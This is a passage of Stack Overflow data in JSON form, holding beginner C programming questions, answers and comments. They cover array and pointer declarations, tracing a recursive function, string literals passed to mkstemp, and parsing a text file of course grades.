correctly pointed out:</p>\n\n<blockquote>\n  <p>The definition of the array's and the function calls for OP is also\n  not correct. Please mention this also.</p>\n</blockquote>\n"}, {"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542177723, "post_id": 53294401, "comment_id": 93469881, "body": "You say &quot;when you declare an array as: <code>int *jerseyNumbers[10]</code> and <code>int *playerRatings[10]</code>, you are declaring 2-d arrays&quot; \u2014 No!  Those are declared as arrays of pointers, which are not the same as 2D arrays, though you can use double subscripts to access both.  You are correct to diagnose that there is a problem there, but the problem you diagnose is wrong.  Your fix is correct \u2014 or one of a few correct notational fixes."}, {"owner": {"reputation": 2191, "user_id": 10232790, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ffWFm9uJgO4/AAAAAAAAAAI/AAAAAAAABjI/hXd8V3yjdoE/photo.jpg?sz=128", "display_name": "Harshith Rai", "link": "https://stackoverflow.com/users/10232790/harshith-rai"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542177930, "post_id": 53294401, "comment_id": 93469955, "body": "Okay @JonathanLeffler, will make the edit. Thanks for the info. by the way is it a pointer to the array or array of pointers?."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1542178161, "post_id": 53294401, "comment_id": 93470042, "body": "The notation <code>int *name[10]</code> is an array of 10 pointers to <code>int</code>.  The notation <code>int (*name)[10]</code> is a (single) pointer to an array of 10 <code>int</code>.  Quite different!"}], "tags": [], "owner": {"reputation": 2191, "user_id": 10232790, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ffWFm9uJgO4/AAAAAAAAAAI/AAAAAAAABjI/hXd8V3yjdoE/photo.jpg?sz=128", "display_name": "Harshith Rai", "link": "https://stackoverflow.com/users/10232790/harshith-rai"}, "is_accepted": false, "score": 3, "last_activity_date": 1542178209, "last_edit_date": 1542178209, "creation_date": 1542177442, "answer_id": 53294401, "question_id": 53293666, "link": "https://stackoverflow.com/questions/53293666/scanf-in-function-seems-to-be-writing-garbage-values-to-one-array-but-not-the-ot/53294401#53294401", "title": "scanf in function seems to be writing garbage values to one array but not the other, despite both being identical", "body": "<p>Refer to @NaveenKumar and @DeiDei's comment to your question. \nActually, the logic of your program is alright. But where you've gone wrong is the syntax regarding how you have declared the arrays and passed them as arguments to the functions. I have listed the changes to be made below:</p>\n\n<ol>\n<li><p>First of all Dylan, do not declare an array as: <code>int\n*jerseyNumbers[10]</code> and <code>int *playerRatings[10]</code>. For the regular array which you actually need, just declare as: </p>\n\n<p>a. <code>*jerseyNumbers</code> and <code>*playerRatings</code>... Remove the size. OR</p>\n\n<p>b. <code>jerseyNumbers[10]</code> and <code>playerRatings[10]</code>... Remove the <code>*</code> from the declaration.</p></li>\n<li>When you're passing these arrays as arguments to a function, don't ever send it how you've done. Just pass the array name as an argument. Like this: <code>getRoster(jerseyNumbers, playerRatings);</code> and <code>menu(jerseyNumbers, playerRatings);</code>.</li>\n<li><p>In the function definition, the parameters representing the array should be either <code>*arrayname</code> or <code>arrayname[size]</code>. Since we have used the first during declaration, use the same here as follows: </p>\n\n<p><code>void getRoster(int *jerseyNumbers, int *playerRatings) {...}</code>,</p>\n\n<p><code>void updateRating(int *jerseyNumbers, int *playerRatings){...}</code>, </p>\n\n<p><code>void  outputRoster(int *jerseyNumbers, int *playerRatings) {...}</code>, </p>\n\n<p><code>void menu(int *jerseyNumbers, int *playerRatings) {...}</code>.</p></li>\n<li><p>And as @PaulSm4 has suggested don't use the semi-colon at the end of an <code>if</code> conditional. Though this isn't the cause of your problem here, it is a practice you need to follow and mistake to be avoided.</p></li>\n</ol>\n\n<p>I have attached the working code below, along with the output.</p>\n\n<p><strong>CODE</strong>:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid getRoster(int *jerseyNumbers, int *playerRatings)\n{\n    int i;\n    for (i=0; i&lt;5; ++i)\n    {\n        printf(\"Enter player %d's jersey number\\n\", i+1);\n        scanf(\"%d\", &amp;jerseyNumbers[i]);\n        printf(\"Enter player %d's rating\\n\", i+1);\n        scanf(\"%d\", &amp;playerRatings[i]);\n    }\n}\n\nvoid updateRating(int *jerseyNumbers, int *playerRatings)\n{\nint i, n = -1, hold;\nprintf(\"Enter a jersey number:\\n\");\nscanf(\"%d\", n);\nfor (i=0; i&lt;5; ++i)\n    if(jerseyNumbers[i]==n)\n        hold = n;\nif (n=-1)\n    printf(\"Error\");\n\nprintf(\"Enter a new rating for player:\\n\");\nscanf(\"%d\", &amp;playerRatings[n]);\n}\n\nvoid aboveRating()\n{\n\n}\n\nvoid replacePlayer()\n{\n\n}\n\nvoid  outputRoster(int *jerseyNumbers, int *playerRatings)\n{\n    int i;\n    for (i=0; i&lt;5; ++i)\n    {\n        printf(\"Player %d  -- Jersey number: %d , Rating: %d \\n\", i+1, jerseyNumbers[i], playerRatings[i]);\n\n    }\n\n }\n\nvoid menu(int *jerseyNumbers, int *playerRatings)\n{\n    char menuInput;\n    printf(\"\\nMENU\\n\");\n    printf(\"u - Update player rating\\n\");\n    printf(\"a - Output players above a rating\\n\");\n    printf(\"r - Replace player\\n\");\n    printf(\"o - Output roster\\n\");\n    printf(\"q - Quit\\n\");\n    printf(\"\\nChoose an option:\\n\");\n\n\n    scanf(\" %c\", &amp;menuInput);\n    if (menuInput == 'u')\n        {updateRating(jerseyNumbers, playerRatings);\n        }\n    else if (menuInput == 'a')\n        {aboveRating();\n        }\n    else if (menuInput == 'r')\n         {replacePlayer();\n        }\n    else if (menuInput == 'o')\n        {outputRoster(jerseyNumbers, playerRatings);\n        }\n    else if (menuInput == 'q')\n        printf(\"Reached Quit\");\n    else\n        printf(\"Input Error\\n\");\n\n}\n\nint main()\n{\n    int jerseyNumbers[10];\n    int playerRatings[10];\n    char menuInput;\n    int quitFlag = 0;\n    getRoster(jerseyNumbers, playerRatings);\n    printf(\"%d %d\", jerseyNumbers[0], playerRatings[1]);\n    menu(jerseyNumbers, playerRatings);\n    return 0;\n}\n</code></pre>\n\n<p><strong>OUTPUT:</strong></p>\n\n<blockquote>\n<pre><code>Enter player 1's jersey number  \n1 \nEnter player 1's rating  \n10 \nEnter player 2's jersey number  \n2 \nEnter player 2's rating  \n20 \nEnter player 3's jersey number  \n3 \nEnter player 3's rating  \n30 \nEnter player 4's jersey number  \n4 \nEnter player 4's rating  \n40 \nEnter player 5's jersey number  \n5 \nEnter player 5's rating  \n50 \n\n1 20 \n\nMENU \n\nu - Update player rating \na - Output players above a rating \nr - Replace player \no - Output roster \nq - Quit\n\nChoose an option:  o \nPlayer 1  -- Jersey number: 1 , Rating: 10 \nPlayer 2  -- Jersey number: 2 , Rating: 20  \nPlayer 3  -- Jersey number: 3 , Rating: 30  \nPlayer 4  -- Jersey number: 4 , Rating: 40 \nPlayer 5  -- Jersey number: 5 , Rating: 50\n</code></pre>\n</blockquote>\n\n<p>Hope this helps.</p>\n"}], "owner": {"reputation": 9, "user_id": 10003206, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0VOH1SKCvxQ/AAAAAAAAAAI/AAAAAAAAADM/SjSqRzWi_jM/photo.jpg?sz=128", "display_name": "Dylan Wolfer", "link": "https://stackoverflow.com/users/10003206/dylan-wolfer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1542178209, "creation_date": 1542173023, "question_id": 53293666, "link": "https://stackoverflow.com/questions/53293666/scanf-in-function-seems-to-be-writing-garbage-values-to-one-array-but-not-the-ot", "title": "scanf in function seems to be writing garbage values to one array but not the other, despite both being identical", "body": "<p>So in the function getRoster, I have two arrays that are defined in the same way in main and called in the same way. But for some reason, one of the scanf functions write garbage data to the array so that in line 91 (A debugging line in this case) one value is the one I entered and the other is seemingly random. I've checked this code top to bottom already to see if there were any notations that I added to one array and not the other, and I can't seem to find a single one.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid getRoster(int *jerseyNumbers[10], int *playerRatings[10])\n{\n    int i;\n    for (i=0; i&lt;5; ++i)\n    {\n        printf(\"Enter player %d's jersey number\\n\", i+1);\n        scanf(\"%d\", &amp;jerseyNumbers[i]);\n        printf(\"Enter player %d's rating\\n\", i+1);\n        scanf(\"%d\", &amp;playerRatings[i]);\n    }\n}\n\nvoid updateRating(int *jerseyNumbers[10], int *playerRatings[10])\n{\nint i, n = -1, hold;\nprintf(\"Enter a jersey number:\\n\");\nscanf(\"%d\", n);\nfor (i=0; i&lt;5; ++i)\n    if(jerseyNumbers[i]==n)\n        hold = n;\nif (n=-1);\nprintf(\"Error\");\n\nprintf(\"Enter a new rating for player:\\n\");\nscanf(\"%d\", &amp;playerRatings[n]);\n}\n\nvoid aboveRating()\n{\n\n}\n\nvoid replacePlayer()\n{\n\n}\n\nvoid  outputRoster(int *jerseyNumbers[10], int *playerRatings[10])\n{\n    int i;\n    for (i=0; i&lt;5; ++i)\n    {\n        printf(\"Player %d  -- Jersey number: %d , Rating: %d \\n\", i+1, jerseyNumbers[i], playerRatings[i]);\n\n    }\n\n }\n\nvoid menu(int *jerseyNumbers[10], int *playerRatings[10])\n{\n    char menuInput;\n    printf(\"\\nMENU\\n\");\n    printf(\"u - Update player rating\\n\");\n    printf(\"a - Output players above a rating\\n\");\n    printf(\"r - Replace player\\n\");\n    printf(\"o - Output roster\\n\");\n    printf(\"q - Quit\\n\");\n    printf(\"\\nChoose an option:\\n\");\n\n\n    scanf(\" %c\", &amp;menuInput);\n    if (menuInput == 'u')\n        {updateRating(&amp;jerseyNumbers[10], &amp;playerRatings[10]);\n        }\n    else if (menuInput == 'a')\n        {aboveRating();\n        }\n    else if (menuInput == 'r')\n         {replacePlayer();\n        }\n    else if (menuInput == 'o')\n        {outputRoster(&amp;jerseyNumbers[10], &amp;playerRatings[10]);\n        }\n    else if (menuInput == 'q')\n        printf(\"Reached Quit\");\n    else\n        printf(\"Input Error\\n\");\n\n}\n\nint main()\n{\n    int *jerseyNumbers[10];\n    int *playerRatings[10];\n    char menuInput;\n    int quitFlag = 0;\n    getRoster(&amp;jerseyNumbers[10], &amp;playerRatings[10]);\n    printf(\"%d %d\", jerseyNumbers[0], playerRatings[1]);\n    menu(&amp;jerseyNumbers[10], &amp;playerRatings[10]);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1542172046, "post_id": 53293468, "comment_id": 93468146, "body": "Try working through it on paper.  If you know how variables, pointers and function calls work in C, and you have access to paper and something to write with, then you have all the tools you need."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 1, "creation_date": 1542183679, "post_id": 53293468, "comment_id": 93472296, "body": "Please see: <a href=\"http://meta.stackoverflow.com/q/284236\">Why is \u201cCan someone help me?\u201d not an actual question?</a>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542189812, "post_id": 53293468, "comment_id": 93475896, "body": "Single-step through it in your debugger and watch the variable values."}], "answers": [{"tags": [], "owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "is_accepted": true, "score": 0, "last_activity_date": 1542173861, "last_edit_date": 1542173861, "creation_date": 1542172991, "answer_id": 53293661, "question_id": 53293468, "link": "https://stackoverflow.com/questions/53293468/please-can-anyone-explain-me-this-recursion-code/53293661#53293661", "title": "Please can anyone explain me this recursion code?", "body": "<p>You need to go through the function line by line.  -- I have ommitted the If condition until the last step for clarity.</p>\n\n<pre><code>// Function Call iteration n = 5, fp = 5\nint fun(int n,int *fp)\n{\n    t = fun(n-1,fp);  -- Call with n = 4, fp = 5.. The recursive \n                         function is called here and the return \n                         value needs to be checked only after all \n                         the functions return.\n\n// First Call\n    t = fun(n-1,fp);  -- Call with n = 3, fp = 5 \n\n// Second call \n    t = fun(n-1,fp);  -- Call with n = 2, fp = 5   \n\n// Third call \n    t = fun(n-1,fp);  -- Call with n = 1, fp = 5   \n\n// Fourth call -- Here the If condition is valid, and the recursive function ends. \n                  We can now check the return values of all functions in reverse order.\n    if(n &lt;=1)\n    {\n        *fp = 1;\n        return 1;\n    }\n\n// After Third call -- fp = 1, t=return of previous == 1\n    f = t + *fp;\n    *fp = t;          -- fp = 2\n    return (f);       -- return 2\n\n// After Second call\n    f = t + *fp;      -- f = 4\n    *fp = t;          -- fp = 4\n    return (f);       -- return 4\n\n // After First call  -- t = 4, fp = 4\n    f = t + *fp;      -- f = 8\n    *fp = t;          -- fp = 8\n    return (f);       -- return 8\n</code></pre>\n\n<p>Final Printed value is <code>8</code></p>\n"}, {"tags": [], "owner": {"reputation": 3, "user_id": 7066040, "user_type": "registered", "profile_image": "https://graph.facebook.com/10209098441951311/picture?type=large", "display_name": "Yined Milanyela Molina Barrios", "link": "https://stackoverflow.com/users/7066040/yined-milanyela-molina-barrios"}, "is_accepted": false, "score": 0, "last_activity_date": 1542174215, "creation_date": 1542174215, "answer_id": 53293845, "question_id": 53293468, "link": "https://stackoverflow.com/questions/53293468/please-can-anyone-explain-me-this-recursion-code/53293845#53293845", "title": "Please can anyone explain me this recursion code?", "body": "<pre><code>#include &lt;stdio.h&gt;\n    int fun(int,int *); // &lt;- define function\n    int main()\n    {\n     int x = 5; // variable x and its value is 5\n    printf(\"%d,the value of fun is:\",fun(5,&amp;x)); //&lt;- print value and function call with var x pointer edit\n    return 0;\n    }\n    int fun(int n,int *fp)//&lt;- define function\n    {\n      int t,f;//two var\n\n      if(n &lt;=1)//if n is small end function and return value \n       {\n        *fp = 1;\n        return 1;\n       }\n      t = fun(n-1,fp); // t any val 1 en recursive method start\n      f = t + *fp;\n      *fp = t;\n      return (f);\n     }\n\n    one\n\n    n = 5     x = 5\n\n    part 1\n    n=5 &lt;= 1 ? -&gt; false\n    n-1 = 4    fp = x = 5\n    call function fun(4,5)\n    -------------\n    Part 2\n    n=4 &lt;= 1 ? -&gt; false\n    n-1 = 3    fp = x = 5\n    call function fun(3,5)\n    --------------\n    Part 3\n    n=3 &lt;= 1 ? -&gt; false\n    n-1 = 2    fp = x = 5\n    call function fun(2,5)\n    ---------------\n    Part 4\n    n=2 &lt;= 1 ? -&gt; false\n    n-2 = 2    fp = x = 5\n    call function fun(1,5)\n    ---------------\n    Part 5\n    n=1 &lt;= 1 ? -&gt; true\n    fp = x = 1\n    return 1\n    --------------\n    ##############\n    --------------\n    return Part 4\n    t = 1 \n    f = t=1 + fp=x=1 = 2\n    fp =x=t=1\n    return (f=2);\n    ---------------\n    return Part 3\n    t = f=2 \n    f = t=2 + fp=x=1 = 3\n    fp =x=t=2\n    return (f=3);\n    ---------------\n    return Part 2\n    t = f=2 \n    f = t=2 + fp=x=2 = 4\n    fp =x=t=2\n    return (f=4);\n    ---------------\n    return Part 1\n    t = f=4 \n    f = t=3 + fp=x=4 = 8\n    fp =x=t=4\n    return (f=8);\n    ---------------\n\n    Exit:\n\n    8,the value of fun i\n</code></pre>\n\n<p>s:</p>\n\n<p>Good (y)</p>\n"}], "owner": {"reputation": 1, "user_id": 10649921, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/736e952b6453e5b64353cc191ba49ad4?s=128&d=identicon&r=PG&f=1", "display_name": "CNOOB", "link": "https://stackoverflow.com/users/10649921/cnoob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "closed_date": 1542194029, "accepted_answer_id": 53293661, "answer_count": 2, "score": -3, "last_activity_date": 1542174215, "creation_date": 1542171761, "question_id": 53293468, "link": "https://stackoverflow.com/questions/53293468/please-can-anyone-explain-me-this-recursion-code", "closed_reason": "Needs details or clarity", "title": "Please can anyone explain me this recursion code?", "body": "<pre><code>#include &lt;stdio.h&gt;\nint fun(int,int *);\nint main()\n{\n int x = 5; // variable x and its value is 5\nprintf(\"%d,the value of fun is:\",fun(5,&amp;x));\nreturn 0;\n}\nint fun(int n,int *fp)\n{\n  int t,f;\n\n  if(n &lt;=1)\n   {\n    *fp = 1;\n    return 1;\n   }\n  t = fun(n-1,fp);\n  f = t + *fp;\n  *fp = t;\n  return (f);\n }\n</code></pre>\n\n<p>I had a test in which this code output was being asked.\nOutput is 8.But i am not being able to understand the logic of this code. </p>\n"}, {"tags": ["c"], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1542170903, "post_id": 53293253, "comment_id": 93467836, "body": "+1 for a correct answer that avoids discussing the stack at all.  &quot;Stack&quot; is not a C language concept.  Rather, it is a (very common) implementation detail.  The important thing is that regardless of the nature or location of any object&#39;s storage, string literals must not be modified.  Of course, any other array whose elements are non-<code>const</code>, such as the OP&#39;s <code>good_template</code>, may be modified."}, {"owner": {"reputation": 13851, "user_id": 7301792, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/K6k1M.png?s=128&g=1", "display_name": "AbstProcDo", "link": "https://stackoverflow.com/users/7301792/abstprocdo"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1542181639, "post_id": 53293253, "comment_id": 93471415, "body": "so I should forget stack, is it right to use stack here? @JohnBollinger"}, {"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "reply_to_user": {"reputation": 13851, "user_id": 7301792, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/K6k1M.png?s=128&g=1", "display_name": "AbstProcDo", "link": "https://stackoverflow.com/users/7301792/abstprocdo"}, "edited": false, "score": 2, "creation_date": 1542184026, "post_id": 53293253, "comment_id": 93472467, "body": "@A_Pivate - The reason you are getting a segmentation fault has nothing to do with the stack. You are modifying a string literal, which should not be modified."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 13851, "user_id": 7301792, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/K6k1M.png?s=128&g=1", "display_name": "AbstProcDo", "link": "https://stackoverflow.com/users/7301792/abstprocdo"}, "edited": false, "score": 0, "creation_date": 1542204034, "post_id": 53293253, "comment_id": 93484493, "body": "@A_Pivate, I don&#39;t mean to say that there <i>isn&#39;t</i> a stack.  I&#39;m just saying that that&#39;s not a good way to think about the problem, nor really about <i>any</i> problem involving C language semantics."}], "tags": [], "owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "is_accepted": true, "score": 3, "last_activity_date": 1542170437, "last_edit_date": 1542170437, "creation_date": 1542170100, "answer_id": 53293253, "question_id": 53293205, "link": "https://stackoverflow.com/questions/53293205/the-stack-a-pointer-reside/53293253#53293253", "title": "The stack a pointer reside", "body": "<blockquote>\n  <p>When the mkstemp function tries to modify the string, a segmentation fault occurs.</p>\n</blockquote>\n\n<p>The reason is because the string declared as <code>char  *bad_template = \"/tmp/dirXXXXXX\";</code> the <code>bad_template</code> is assigned to a <strong>character string literal</strong>. </p>\n\n<p>In <code>C</code>, modifying a string literal is undefined behaviour</p>\n\n<p>Reference - Section 6.4.5-6 of C99 Standard</p>\n\n<blockquote>\n  <p>A character string literal is a sequence of zero or more multibyte characters enclosed in\n  double-quotes, as in \"xyz\". A wide string literal is the same, except prefixed by the letter L.</p>\n  \n  <p>If the program attempts to modify such an array, the behavior is undefined.</p>\n</blockquote>\n"}], "owner": {"reputation": 13851, "user_id": 7301792, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/K6k1M.png?s=128&g=1", "display_name": "AbstProcDo", "link": "https://stackoverflow.com/users/7301792/abstprocdo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "closed_date": 1542183572, "accepted_answer_id": 53293253, "answer_count": 1, "score": -1, "last_activity_date": 1542170437, "creation_date": 1542169734, "question_id": 53293205, "link": "https://stackoverflow.com/questions/53293205/the-stack-a-pointer-reside", "closed_reason": "Duplicate", "title": "The stack a pointer reside", "body": "<p>I read a make_tempory_file demonstration in APUE, and confused about:</p>\n\n<blockquote>\n  <p><code>char  good_template[] = \"/tmp/dirXXXXXX\"; /* right way */</code><br>\n  <code>char  *bad_template = \"/tmp/dirXXXXXX\"; /* wrong way*/</code></p>\n</blockquote>\n\n<pre><code>void make_temp(char *template);\n\nint main()\n{\n    char  good_template[] = \"/tmp/dirXXXXXX\"; /* right way */\n    char  *bad_template = \"/tmp/dirXXXXXX\"; /* wrong way*/\n\n    printf(\"trying to create first temp file...\\n\");\n    make_temp(good_template);\n    printf(\"trying to create second temp file...\\n\");\n    make_temp(bad_template);\n    exit(0);\n}\n\nvoid make_temp(char *template)\n{\n    int fd;\n    struct stat sbuf;\n\n    if ((fd = mkstemp(template)) &lt; 0)\n\n        err_sys(\"can\u2019t create temp file\");\n    printf(\"temp name = %s\\n\", template);\n    close(fd);\n    if (stat(template, &amp;sbuf) &lt; 0)\n    {\n        if (errno == ENOENT)\n\n            printf(\"file doesn\u2019t exist\\n\");\n        else\n            err_sys(\"stat failed\");\n    }\n    else\n    {\n        printf(\"file exists\\n\");\n        unlink(template);\n    }\n}\n</code></pre>\n\n<p>The instruction explain it:</p>\n\n<blockquote>\n  <p>The difference in behavior comes from the way the two template strings are declared. For the \ufb01rst template, <strong>the name is allocated on the stack,</strong> because we use an array variable. For the second name, however, we use a pointer. <strong>In this case, only the memory for the pointer itself resides on the stack;</strong> the compiler arranges for the string to be stored in the read-only segment of the executable. When the mkstemp function tries to modify the string, a segmentation fault occurs.</p>\n</blockquote>\n\n<p>I tried to understand the statement but stuck with <code>stack</code></p>\n\n<p>Does it refer to the stack where the arrow point to?</p>\n\n<p><a href=\"https://i.stack.imgur.com/j7wMe.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/j7wMe.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": ["c", "arrays", "string", "file"], "comments": [{"owner": {"reputation": 500, "user_id": 1708116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4OCsL.jpg?s=128&g=1", "display_name": "arjayosma", "link": "https://stackoverflow.com/users/1708116/arjayosma"}, "edited": false, "score": 0, "creation_date": 1542168596, "post_id": 53292968, "comment_id": 93467343, "body": "when the program iterates through your file, your very first fscanf successfully retrieves the course, then checks the succeeding values. so once your loop iterates again, then the fscanf will check on the digit side, and you are fetching it as a string... might want to consider having a fixed length grade to scan only once with &quot;%s %d %d %d %d %d ...&quot;"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1542168885, "post_id": 53292968, "comment_id": 93467405, "body": "The best thing to do is see one of the teacher&#39;s assistants. You need a lot more help than can be provided in a stack overflow Q&amp;A."}, {"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "edited": false, "score": 1, "creation_date": 1542169444, "post_id": 53292968, "comment_id": 93467511, "body": "A hint - Take it line by line. For the first line you first scan the Name - put that in the courses array. Then scan the amount of grades. Put that in amount of grades array. Then run a loop for no of grades (scanned previously, say n). Scan n grades. Calculate the average. Put the average in the average array. Repeat entire thing 3 times for 3 lines (or until end of file)"}], "answers": [{"tags": [], "owner": {"reputation": 2888, "user_id": 444885, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/bb90d3043cabe9cb5b063ae29cdaa1fc?s=128&d=identicon&r=PG", "display_name": "dmitri", "link": "https://stackoverflow.com/users/444885/dmitri"}, "is_accepted": false, "score": 0, "last_activity_date": 1542169870, "creation_date": 1542169870, "answer_id": 53293228, "question_id": 53292968, "link": "https://stackoverflow.com/questions/53292968/c-file-with-both-integer-and-string-division-problems/53293228#53293228", "title": "C - File with both Integer and String (Division Problems)", "body": "<p><code>fscanf(, \"%s\", buffer)</code> reads a string until a whitespace and puts the result in the buffer.</p>\n\n<p>First call <code>fscanf(fp, \"%s\", courses);</code> will read Mathematics and store the word in courses array.\nSecond call <code>fscanf(fp, \"%s\", courses);</code> will read 5 and store the character in courses array</p>\n\n<p>You will need to convert characters to numbers, check for newlines, handle errors - what if an incoming character is not a digit, etc?</p>\n\n<p>Your first call fscanf(fp, \"%s\", &amp;courses[i]); gets a course name. Second iteration of your loop will give you \"M1thematics\" in the courses. You don't need [i] part. You need to change your loop. And what's that arbitrary 300 number?</p>\n\n<p>Another hint: &amp;courses[0] points to the start of the array, same as just courses. &amp;courses[1] points to the second element in courses.</p>\n\n<p>The rest is up to you.</p>\n"}, {"tags": [], "owner": {"reputation": 105, "user_id": 9054412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e48e9c9d95738c80ae47ceb93acc68f?s=128&d=identicon&r=PG&f=1", "display_name": "coddygeek", "link": "https://stackoverflow.com/users/9054412/coddygeek"}, "is_accepted": true, "score": 0, "last_activity_date": 1542283119, "creation_date": 1542283119, "answer_id": 53319021, "question_id": 53292968, "link": "https://stackoverflow.com/questions/53292968/c-file-with-both-integer-and-string-division-problems/53319021#53319021", "title": "C - File with both Integer and String (Division Problems)", "body": "<p>You can solve this problem by reading the file line by line using fgets(),and extracting each word in line using strtok().strtok can separate line into words if we give delimiter as space.Below i am giving a code to extract courses and total_number of grades in my.txt to separate array. An unrefined Code written by me is given below.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;string.h&gt;\nvoid print_word (char *str ,int i);\nstatic char content[10][40];\nchar courses[10][20];\nint total_num_grades[10];\nint line_count =0 ;\n\nvoid parse_word (char *str ,int line_num)\n{\n        char *temp ;\n        int word_num = 0;\n        printf (\"Splitting string \\\"%s\\\" into tokens:\\n\",str);\n        temp  = strtok (str,\" \"); //taking first word of line\n        strcpy(courses[line_num] ,temp);\n        temp = strtok (NULL, \" \"); //taking second word of line\n        total_num_grades[line_num] = atoi(temp);\n\n\n}\n\nvoid print_result()\n{\n        printf(\"courses in the text \\n\\n\");\n        for(int i = 0; i &lt;line_count ; i ++)\n        {\n                printf(\"%s\\n\",courses[i]);\n        }\n        printf (\"\\n\\nnumber of grade array \\n\\n\");\n        for(int i = 0;i &lt; line_count ;i ++)\n        {\n                printf(\"%d\\n\",total_num_grades[i]);\n        }\n}\n\nint main () {\n        FILE *fp;\n        int len = 0,read = 0;\n        fp = fopen(\"my.txt\", \"r\");\n        while ((fgets(content[line_count], 400, fp))) {\n                printf(\"%s\", content[line_count]);\n                line_count ++;\n        }\n        for (int line_num = 0; line_num &lt; line_count ; line_num++)\n        {\n         